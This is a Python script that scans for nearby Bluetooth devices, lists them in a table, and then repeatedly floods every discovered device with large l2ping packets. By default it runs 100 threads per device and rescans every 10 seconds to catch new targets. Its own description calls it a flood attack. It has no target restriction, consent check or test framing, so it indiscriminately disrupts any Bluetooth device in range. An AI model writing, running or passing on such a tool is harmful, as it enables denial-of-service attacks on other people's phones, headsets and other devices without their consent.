import asyncio
from bleak import BleakScanner
from rich.console import Console
from rich.table import Table
import subprocess
import threading
import argparse

async def scan_devices():
    """Scan for Bluetooth devices and return a list of discovered devices."""
    scanner = BleakScanner()
    await scanner.start()
    await asyncio.sleep(5)  # Scan for 5 seconds
    await scanner.stop()
    devices = scanner.discovered_devices
    return devices

def display_devices(devices):
    """Display the discovered Bluetooth devices."""
    console = Console()
    table = Table(title="Bluetooth Devices")
    table.add_column("No.", justify="center", style="cyan")
    table.add_column("Device Name", style="magenta")
    table.add_column("MAC Address", style="green")

    for i, device in enumerate(devices, start=1):
        device_name = device.name or "Unknown"
        mac_address = device.address
        table.add_row(str(i), device_name, mac_address)

    console.print(table)

def l2ping_flood(mac):
    """Send l2ping flood to the specified MAC address."""
    p = subprocess.Popen(["l2ping", "-s", "600", "-f", mac])
    p.communicate()
    return p.returncode

def flood_devices(mac_addresses, processes):
    """Flood all discovered devices."""
    threads = []
    for mac_address in mac_addresses:
        for _ in range(processes):
            t = threading.Thread(target=l2ping_flood, args=(mac_address,))
            t.daemon = True
            t.start()
            threads.append(t)
    
    for t in threads:
        t.join()

async def continuous_scan(flood_event, mac_addresses, processes):
    """Continuously scan for Bluetooth devices and update the list."""
    while True:
        devices = await scan_devices()
        new_mac_addresses = [device.address for device in devices]
        
        if new_mac_addresses != mac_addresses:
            mac_addresses.clear()
            mac_addresses.extend(new_mac_addresses)
            display_devices(devices)
            flood_event.set()

        await asyncio.sleep(10)  # Wait before next scan

def main():
    """Main function to integrate scanning and l2ping flood attack."""
    parser = argparse.ArgumentParser(description='Bluetooth l2ping flood tool')
    parser.add_argument('-p', '--processes', help='Number of processes to run l2ping per device. Default is 100', default=100, type=int)
    args = parser.parse_args()

    flood_event = threading.Event()
    mac_addresses = []

    async def async_main():
        await continuous_scan(flood_event, mac_addresses, args.processes)

    flood_thread = threading.Thread(target=asyncio.run, args=(async_main(),))
    flood_thread.daemon = True
    flood_thread.start()

    try:
        while True:
            flood_event.wait()
            flood_event.clear()
            flood_devices(mac_addresses, args.processes)
    except KeyboardInterrupt:
        print("Stopping...")

if __name__ == "__main__":
    main()
